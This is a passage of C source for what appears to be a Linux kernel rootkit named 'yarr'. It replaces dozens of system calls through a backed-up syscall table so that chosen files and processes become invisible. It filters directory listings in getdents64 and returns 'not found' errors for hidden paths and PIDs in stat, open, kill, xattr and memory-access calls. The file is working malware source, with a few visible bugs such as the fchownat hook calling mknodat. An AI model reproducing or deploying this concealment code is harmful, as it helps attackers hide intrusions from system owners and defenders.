	int ret = -ENOENT;

	// debug("yarr_truncate64() called.\n");
	sys_truncate64 = sys_call_table_backup[__NR_truncate64];

	if (!isFileHidden(path))
		ret = sys_truncate64(path, length);

	return ret;
}

asmlinkage long yarr_stat64(const char __user *filename,
							struct stat64 __user *statbuf) {
	asmlinkage long (*sys_stat64)(const char __user *, struct stat64 __user *);
	int ret = -ENOENT;

	// debug("yarr_stat64() called.\n");
	sys_stat64 = sys_call_table_backup[__NR_stat64];

	if (!isFileHidden(filename))
		ret = sys_stat64(filename, statbuf);

	return ret;
}

asmlinkage long yarr_lstat64(const char __user *filename,
							 struct stat64 __user *statbuf) {
	asmlinkage long (*sys_lstat64)(const char __user *,
								   struct stat64 __user *);
	int ret = -ENOENT;

	// debug("yarr_lstat64() called.\n");
	sys_lstat64 = sys_call_table_backup[__NR_lstat64];

	if (!isFileHidden(filename))
		ret = sys_lstat64(filename, statbuf);

	return ret;
}

asmlinkage long yarr_pivot_root(const char __user *new_root,
								const char __user *put_old) {
	asmlinkage long (*sys_pivot_root)(const char __user *,
									  const char __user *);
	int ret = -ENOTDIR;

	// debug("yarr_pivot_root() called.\n");
	sys_pivot_root = sys_call_table_backup[__NR_pivot_root];

	if (!isFileHidden(new_root) && !isFileHidden(put_old))
		ret = sys_pivot_root(new_root, put_old);

	return ret;
}

asmlinkage long yarr_getdents64(unsigned int fd,
								struct linux_dirent64 __user *dirent,
								unsigned int count) {
	asmlinkage long (*sys_getdents64)(unsigned int,
									  struct linux_dirent64 __user *,
									  unsigned int);
	int ret;

	// TODO: PoC declarations.
	char *aux_list, *buf;
	int bpos, apos;
	struct linux_dirent64 *d;

	// debug("yarr_getdents64() called.\n");
	sys_getdents64 = sys_call_table_backup[__NR_getdents64];
	ret = sys_getdents64(fd, dirent, count);

	// Here comes the black magic... We inspect all the dirents looking
	// for anything we are hidding, if we find something we have to remove
	// that dirent and move the rest.
	
	// TODO: This code overloads this system call quite a few, with directories
	// with a lot of files this could cause an unacceptable overhead. Another
	// approach could be go deep in sys_getdents64, understand how it works and
	// control the dirents while they are being added.

	// TODO: Ok, right now this is not correct. We are just looking the inodes
	// in the list of hidden files, but we should check in WHICH FILESYSTEM the
	// fd file descriptor is and also check the MOUNT ID.

	// We create an auxiliar list, we iterate over the original list checking
	// whether the current dirent inode number is being hidden or not, if not
	// we copy that dirent to our auxiliar list. When we finish traversing the
	// list we have in our auxiliar list the dirents to be shown, so we copy
	// it to the user list and return.
	if (ret > 0) {

		aux_list = (char *)kmalloc(ret, GFP_KERNEL);
		if (aux_list == NULL) {
			debug("Oops! yarr_getdents64(): kmalloc().\n");
			return ret;
		}

		buf = (char *)dirent;
		apos = 0;
		for (bpos=0; bpos<ret;) {
			d = (struct linux_dirent64 *)(buf + bpos);
			if (!isInodeHidden(d->d_ino)) {
				kmemcpy(aux_list + apos, d, d->d_reclen);
				apos += d->d_reclen;
			}

			bpos += d->d_reclen;
		}

		kmemcpy(dirent, aux_list, apos);
		kfree(aux_list);
		ret = apos;
	}

	return ret;
}

// TODO: Not sure if this syscall can return ENOENT, I have read a bit of
// the kernel code but not too much.
asmlinkage long yarr_setxattr(const char __user *path, const char __user *name,
							  const void __user *value, size_t size,
							  int flags) {
	asmlinkage long (*sys_setxattr)(const char __user *, const char __user *,
									const void __user *, size_t, int);
	int ret = -ENOENT;

	// debug("yarr_setxattr() called.\n");
	sys_setxattr = sys_call_table_backup[__NR_setxattr];

	if (!isFileHidden(path))
		ret = sys_setxattr(path, name, value, size, flags);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_lsetxattr(const char __user *path,
							   const char __user *name,
							   const void __user *value,
							   size_t size, int flags) {
	asmlinkage long (*sys_lsetxattr)(const char __user *, const char __user *,
									 const void __user *, size_t, int);
	int ret = -ENOENT;

	// debug("yarr_lsetxattr() called.\n");
	sys_lsetxattr = sys_call_table_backup[__NR_lsetxattr];

	if (!isFileHidden(path))
		ret = sys_lsetxattr(path, name, value, size, flags);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_getxattr(const char __user *path,
							  const char __user *name,
							  const void __user *value,
							  size_t size) {
	asmlinkage long (*sys_getxattr)(const char __user *, const char __user *,
									const void __user *, size_t);
	int ret = -ENOENT;

	// debug("yarr_getxattr() called.\n");
	sys_getxattr = sys_call_table_backup[__NR_getxattr];

	if (!isFileHidden(path))
		ret = sys_getxattr(path, name, value, size);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_lgetxattr(const char __user *path,
							   const char __user *name,
							   const void __user *value,
							   size_t size) {
	asmlinkage long (*sys_lgetxattr)(const char __user *, const char __user *,
									 const void __user *, size_t);
	int ret = -ENOENT;

	// debug("yarr_lgetxattr() called.\n");
	sys_lgetxattr = sys_call_table_backup[__NR_lgetxattr];

	if (!isFileHidden(path))
		ret = sys_lgetxattr(path, name, value, size);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_listxattr(const char __user *path, char __user *list,
							   size_t size) {
	asmlinkage long (*sys_listxattr)(const char __user *, char __user *,
									 size_t);
	int ret = -ENOENT;

	// debug("yarr_listxattr() called.\n");
	sys_listxattr = sys_call_table_backup[__NR_listxattr];

	if (!isFileHidden(path))
		ret = sys_listxattr(path, list, size);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_llistxattr(const char __user *path, char __user *list,
								size_t size) {
	asmlinkage long (*sys_llistxattr)(const char __user *, char __user *,
									  size_t);
	int ret = -ENOENT;

	// debug("yarr_llistxattr() called.\n");
	sys_llistxattr = sys_call_table_backup[__NR_llistxattr];

	if (!isFileHidden(path))
		ret = sys_llistxattr(path, list, size);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_removexattr(const char __user *path,
								 const char __user *name) {
	asmlinkage long (*sys_removexattr)(const char __user *,
									   const char __user *);
	int ret = -ENOENT;

	// debug("yarr_removexattr() called.\n");
	sys_removexattr = sys_call_table_backup[__NR_removexattr];

	if (!isFileHidden(path))
		ret = sys_removexattr(path, name);

	return ret;
}

// TODO: The same as setxattr.
asmlinkage long yarr_lremovexattr(const char __user *path,
								  const char __user *name) {
	asmlinkage long (*sys_lremovexattr)(const char __user *,
										const char __user *);
	int ret = -ENOENT;

	// debug("yarr_lremovexattr() called.\n");
	sys_lremovexattr = sys_call_table_backup[__NR_lremovexattr];

	if (!isFileHidden(path))
		ret = sys_lremovexattr(path, name);

	return ret;
}

asmlinkage long yarr_tkill(pid_t pid, int sig) {
	asmlinkage long (*sys_tkill)(pid_t, int);
	int ret = -ESRCH;

	// debug("yarr_rt_tkill() called.\n");
	sys_tkill = sys_call_table_backup[__NR_tkill];

	if (!isProcHidden(pid))
		ret = sys_tkill(pid, sig);

	return ret;
}

asmlinkage long yarr_sched_setaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr) {
	asmlinkage long (*sys_sched_setaffinity)(int, unsigned int,
											 unsigned long __user *);
	int ret = -ESRCH;

	// debug("yarr_sched_setaffinity() called.\n");
	sys_sched_setaffinity = sys_call_table_backup[__NR_sched_setaffinity];

	if (!isProcHidden(pid))
		ret = sys_sched_setaffinity(pid, len, user_mask_ptr);

	return ret;
}

asmlinkage long yarr_sched_getaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr) {
	asmlinkage long (*sys_sched_getaffinity)(int, unsigned int,
											 unsigned long __user *);
	int ret = -ESRCH;

	// debug("yarr_sched_getaffinity() called.\n");
	sys_sched_getaffinity = sys_call_table_backup[__NR_sched_getaffinity];

	if (!isProcHidden(pid))
		ret = sys_sched_getaffinity(pid, len, user_mask_ptr);

	return ret;
}

asmlinkage long yarr_statfs64(const char __user *path, size_t sz,
							  struct statfs64 __user *buf) {
	asmlinkage long (*sys_statfs64)(const char __user *, size_t,
									struct statfs64 __user *);
	int ret = -ENOENT;

	// debug("yarr_statfs64() called.\n");
	sys_statfs64 = sys_call_table_backup[__NR_statfs64];

	if (!isFileHidden(path))
		ret = sys_statfs64(path, sz, buf);

	return ret;
}

// TODO: As far as I have understood PIDs are in fact groups of threads, when
// kill is used to signal a PID it signals a whole group of threads, tgkill is
// used to signal one thread inside a thread group. This should be improved,
// I'm not really sure if we are killing the right task :).
asmlinkage long yarr_tgkill(int tgid, int pid, int sig) {
	asmlinkage long (*sys_tgkill)(int, int, int);
	int ret = -ESRCH;

	// debug("yarr_tgkill() called.\n");
	sys_tgkill = sys_call_table_backup[__NR_tgkill];

	if (!isProcHidden(pid))
		ret = sys_tgkill(tgid, pid, sig);

	return ret;
}

// TODO: The returned value ENOENT should be checked and confirmed... or
// changed.
asmlinkage long yarr_mq_open(const char __user *name, int oflag, mode_t mode,
							 struct mq_attr __user *attr) {
	asmlinkage long (*sys_mq_open)(const char __user *, int, mode_t,
								   struct mq_attr __user *);
	int ret = -ENOENT;

	// debug("yarr_mq_open() called.\n");
	sys_mq_open = sys_call_table_backup[__NR_mq_open];

	if (!isFileHidden(name))
		ret = sys_mq_open(name, oflag, mode, attr);

	return ret;
}

// TODO: Same as mq_open.
asmlinkage long yarr_mq_unlink(const char __user *name) {
	asmlinkage long (*sys_mq_unlink)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_mq_unlink() called.\n");
	sys_mq_unlink = sys_call_table_backup[__NR_mq_unlink];

	if (!isFileHidden(name))
		ret = sys_mq_unlink(name);

	return ret;
}

// TODO: Another wait syscall, another buggy syscall...
asmlinkage long yarr_waitid(int which, pid_t pid, struct siginfo __user *infop,
							int options, struct rusage __user *ru) {
	asmlinkage long (*sys_waitid)(int, pid_t, struct siginfo __user *, int,
								  struct rusage __user *);
	int ret = -ESRCH;

	// debug("yarr_waitid() called.\n");
	sys_waitid = sys_call_table_backup[__NR_waitid];

	if (!isProcHidden(pid))
		ret = sys_waitid(which, pid, infop, options, ru);

	return ret;
}

// TODO: This condition should be tested.
asmlinkage long yarr_ioprio_set(int which, int who, int ioprio) {
	asmlinkage long (*sys_ioprio_set)(int, int, int);
	int ret = -ESRCH;

	// debug("yarr_ioprio_set() called.\n");
	sys_ioprio_set = sys_call_table_backup[__NR_ioprio_set];

	if (which != IOPRIO_WHO_PROCESS || !isProcHidden(who))
		ret = sys_ioprio_set(which, who, ioprio);

	return ret;
}

// TODO: This condition should be tested.
asmlinkage long yarr_ioprio_get(int which, int who, int ioprio) {
	asmlinkage long (*sys_ioprio_get)(int, int, int);
	int ret = -ESRCH;

	// debug("yarr_ioprio_get() called.\n");
	sys_ioprio_get = sys_call_table_backup[__NR_ioprio_get];

	if (which != IOPRIO_WHO_PROCESS || !isProcHidden(who))
		ret = sys_ioprio_get(which, who, ioprio);

	return ret;
}

asmlinkage long yarr_migrate_pages(pid_t pid, unsigned long maxnode,
								   const unsigned long __user *from,
								   const unsigned long __user *to) {
	asmlinkage long (*sys_migrate_pages)(pid_t, unsigned long,
									  const unsigned long __user *,
									  const unsigned long __user *);
	int ret = -ESRCH;

	// debug("yarr_migrate_pages() called.\n");
	sys_migrate_pages = sys_call_table_backup[__NR_migrate_pages];

	if (!isProcHidden(pid))
		ret = sys_migrate_pages(pid, maxnode, from, to);

	return ret;
}

asmlinkage long yarr_openat(int dfd, const char __user *filename, int flags,
							int mode) {
	asmlinkage long (*sys_openat)(int, const char __user *, int, int);
	int ret = -ENOENT;

	// debug("yarr_openat() called.\n");
	sys_openat = sys_call_table_backup[__NR_openat];

	if (!isFileHidden(filename))
		ret = sys_openat(dfd, filename, flags, mode);

	return ret;
}

asmlinkage long yarr_mkdirat(int dfd, const char __user *pathname, int mode) {
	asmlinkage long (*sys_mkdirat)(int, const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_mkdirat() called.\n");
	sys_mkdirat = sys_call_table_backup[__NR_mkdirat];

	if (!isFileHidden(pathname))
		ret = sys_mkdirat(dfd, pathname, mode);

	return ret;
}

asmlinkage long yarr_mknodat(int dfd, const char __user *filename, int mode,
							 int dev) {
	asmlinkage long (*sys_mknodat)(int, const char __user *, int, int);
	int ret = -ENOMEM;

	// debug("yarr_mknodat() called.\n");
	sys_mknodat = sys_call_table_backup[__NR_mknodat];

	if (!isFileHidden(filename))
		ret = sys_mknodat(dfd, filename, mode, dev);

	return ret;
}

asmlinkage long yarr_fchownat(int dfd, const char __user *filename, uid_t user,
							  gid_t group, int flag) {
	asmlinkage long (*sys_mknodat)(int, const char __user *, uid_t, gid_t,
								   int);
	int ret = -ENOENT;

	// debug("yarr_mknodat() called.\n");
	sys_mknodat = sys_call_table_backup[__NR_mknodat];

	if (!isFileHidden(filename))
		ret = sys_mknodat(dfd, filename, user, group, flag);

	return ret;
}

asmlinkage long yarr_futimesat(int dfd, const char __user *filename,
							   struct timeval __user *utimes) {
	asmlinkage long (*sys_futimesat)(int, const char __user *,
									 struct timeval __user *);
	int ret = -ENOENT;

	// debug("yarr_futimesat() called.\n");
	sys_futimesat = sys_call_table_backup[__NR_futimesat];

	if (!isFileHidden(filename))
		ret = sys_futimesat(dfd, filename, utimes);

	return ret;
}

asmlinkage long yarr_fstatat64(int dfd, const char __user *filename,
							   struct stat64 __user *statbuf, int flag) {
	asmlinkage long (*sys_fstatat64)(int, const char __user *,
									 struct stat64 __user *, int);
	int ret = -ENOENT;

	// debug("yarr_fstatat64() called.\n");
	sys_fstatat64 = sys_call_table_backup[__NR_fstatat64];

	if (!isFileHidden(filename))
		ret = sys_fstatat64(dfd, filename, statbuf, flag);

	return ret;
}

asmlinkage long yarr_unlinkat(int dfd, const char __user *pathname, int flag) {
	asmlinkage long (*sys_unlinkat)(int, const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_unlinkat() called.\n");
	sys_unlinkat = sys_call_table_backup[__NR_unlinkat];

	if (!isFileHidden(pathname))
		ret = sys_unlinkat(dfd, pathname, flag);

	return ret;
}

// TODO: Check the special case.
asmlinkage long yarr_renameat(int olddfd, const char __user *oldname,
							  int newdfd, const char __user *newname) {
	asmlinkage long (*sys_renameat)(int, const char __user *, int,
									const char __user *);
	int ret = -ENOENT;

	// debug("yarr_renameat() called.\n");
	sys_renameat = sys_call_table_backup[__NR_renameat];

	if (!isFileHidden(oldname) && !isFileHidden(newname))
		ret = sys_renameat(olddfd, oldname, newdfd, newname);
	else if (isFileHidden(newname))
		ret = -ENOMEM;

	return ret;
}

// TODO: Check the special case.
asmlinkage long yarr_linkat(int olddfd, const char __user *oldname,
							int newdfd, const char __user *newname, int flag) {
	asmlinkage long (*sys_linkat)(int, const char __user *, int,
								  const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_linkat() called.\n");
	sys_linkat = sys_call_table_backup[__NR_linkat];

	if (!isFileHidden(oldname) && !isFileHidden(newname))
		ret = sys_linkat(olddfd, oldname, newdfd, newname, flag);
	else if (isFileHidden(newname))
		ret = -ENOMEM;

	return ret;
}

// TODO: Check the special case.
asmlinkage long yarr_symlinkat(const char __user *oldname, int newdfd,
							   const char __user *newname) {
	asmlinkage long (*sys_symlinkat)(const char __user *, int,
									 const char __user *);
	int ret = -ENOENT;

	// debug("yarr_symlinkat() called.\n");
	sys_symlinkat = sys_call_table_backup[__NR_symlinkat];

	if (!isFileHidden(oldname) && !isFileHidden(newname))
		ret = sys_symlinkat(oldname, newdfd, newname);
	else if (isFileHidden(newname))
		ret = -ENOMEM;

	return ret;
}

asmlinkage long yarr_readlinkat(int dfd, const char __user *path,
								char __user *buf, int bufsiz) {
	asmlinkage long (*sys_readlinkat)(int, const char __user *, char __user *,
									  int);
	int ret = -ENOENT;

	// debug("yarr_readlinkat() called.\n");
	sys_readlinkat = sys_call_table_backup[__NR_readlinkat];

	if (!isFileHidden(path))
		ret = sys_readlinkat(dfd, path, buf, bufsiz);

	return ret;
}

asmlinkage long yarr_fchmodat(int dfd, const char __user *filename,
							  mode_t mode) {
	asmlinkage long (*sys_fchmodat)(int, const char __user *, mode_t);
	int ret = -ENOENT;

	// debug("yarr_fchmodat() called.\n");
	sys_fchmodat = sys_call_table_backup[__NR_fchmodat];

	if (!isFileHidden(filename))
		ret = sys_fchmodat(dfd, filename, mode);

	return ret;
}

asmlinkage long yarr_faccessat(int dfd, const char __user *filename,
							   int mode) {
	asmlinkage long (*sys_faccessat)(int, const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_faccessat() called.\n");
	sys_faccessat = sys_call_table_backup[__NR_faccessat];

	if (!isFileHidden(filename))
		ret = sys_faccessat(dfd, filename, mode);

	return ret;
}

asmlinkage long yarr_move_pages(pid_t pid, unsigned long nr_pages,
								const void __user * __user *pages,
								const int __user *nodes,
								int __user *status, int flags) {
	asmlinkage long (*sys_move_pages)(pid_t, unsigned long,
									  const void __user * __user *,
									  const int __user *, int __user *, int);
	int ret = -ESRCH;

	// debug("yarr_move_pages() called.\n");
	sys_move_pages = sys_call_table_backup[__NR_move_pages];

	if (!isProcHidden(pid))
		ret = sys_move_pages(pid, nr_pages, pages, nodes, status, flags);

	return ret;
}

asmlinkage long yarr_utimensat(int dfd, const char __user *filename,
							   struct timespec __user *utimes, int flags) {
	asmlinkage long (*sys_utimensat)(int, const char __user *,
									 struct timespec __user *, int);
	int ret = -ENOENT;

	// debug("yarr_utimensat() called.\n");
	sys_utimensat = sys_call_table_backup[__NR_utimensat];

	if (!isFileHidden(filename))
		ret = sys_utimensat(dfd, filename, utimes, flags);

	return ret;
}

// TODO: Another syscall that deals with thread groups. Read tgkill().
asmlinkage long yarr_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
									   siginfo_t __user *uinfo) {
	asmlinkage long (*sys_rt_tgsigqueueinfo)(pid_t, pid_t, int,
											 siginfo_t __user *);
	int ret = -ESRCH;

	// debug("yarr_rt_tgsigqueueinfo() called.\n");
	sys_rt_tgsigqueueinfo = sys_call_table_backup[__NR_rt_tgsigqueueinfo];

	if (!isProcHidden(pid))
		ret = sys_rt_tgsigqueueinfo(tgid, pid, sig, uinfo);

	return ret;
}

asmlinkage long yarr_perf_event_open(struct perf_event_attr __user *attr_uptr,
									 pid_t pid, int cpu, int group_fd,
									 unsigned long flags) {
	asmlinkage long (*sys_perf_event_open)(struct perf_event_attr __user *,
										   pid_t, int, int, unsigned long);
	int ret = -ESRCH;

	// debug("yarr_perf_event_open() called.\n");
	sys_perf_event_open = sys_call_table_backup[__NR_perf_event_open];

	if (!isProcHidden(pid))
		ret = sys_perf_event_open(attr_uptr, pid, cpu, group_fd, flags);

	return ret;
}

asmlinkage long yarr_prlimit64(pid_t pid, unsigned int resource,
							   const struct rlimit64 __user *new_rlim,
							   struct rlimit64 __user *old_rlim) {
	asmlinkage long (*sys_prlimit64)(pid_t, unsigned int,
									 const struct rlimit64 __user *,
									 struct rlimit64 __user *);
	int ret = -ESRCH;

	// debug("yarr_prlimit64() called.\n");
	sys_prlimit64 = sys_call_table_backup[__NR_prlimit64];

	if (!isProcHidden(pid))
		ret = sys_prlimit64(pid, resource, new_rlim, old_rlim);

	return ret;
}

asmlinkage long yarr_name_to_handle_at(int dfd, const char __user *name,
									   struct file_handle __user *handle,
									   int __user *mnt_id, int flag) {
	asmlinkage long (*sys_name_to_handle_at)(int, const char __user *,
									 		 struct file_handle __user *,
											 int __user *, int);
	int ret = -ENOENT;

	// debug("yarr_name_to_handle_at() called.\n");
	sys_name_to_handle_at = sys_call_table_backup[__NR_name_to_handle_at];

	if (!isFileHidden(name))
		ret = sys_name_to_handle_at(dfd, name, handle, mnt_id, flag);

	return ret;
}

asmlinkage long yarr_process_vm_readv(pid_t pid,
									  const struct iovec __user *lvec,
									  unsigned long liovcnt,
									  const struct iovec __user *rvec,
									  unsigned long riovcnt,
									  unsigned long flags) {
	asmlinkage long (*sys_process_vm_readv)(pid_t,
											const struct iovec __user *,
											unsigned long,
											const struct iovec __user *,
											unsigned long,
											unsigned long);
	int ret = -ESRCH;

	// debug("yarr_process_vm_readv() called.\n");
	sys_process_vm_readv = sys_call_table_backup[__NR_process_vm_readv];

	if (!isProcHidden(pid))
		ret = sys_process_vm_readv(pid, lvec, liovcnt, rvec, riovcnt, flags);

	return ret;
}

asmlinkage long yarr_process_vm_writev(pid_t pid,
									   const struct iovec __user *lvec,
									   unsigned long liovcnt,
									   const struct iovec __user *rvec,
									   unsigned long riovcnt,
									   unsigned long flags) {
	asmlinkage long (*sys_process_vm_writev)(pid_t,
											 const struct iovec __user *,
											 unsigned long,
											 const struct iovec __user *,
											 unsigned long,
											 unsigned long);
	int ret = -ESRCH;

	// debug("yarr_process_vm_writev() called.\n");
	sys_process_vm_writev = sys_call_table_backup[__NR_process_vm_writev];

	if (!isProcHidden(pid))
		ret = sys_process_vm_writev(pid, lvec, liovcnt, rvec, riovcnt, flags);

	return ret;
}

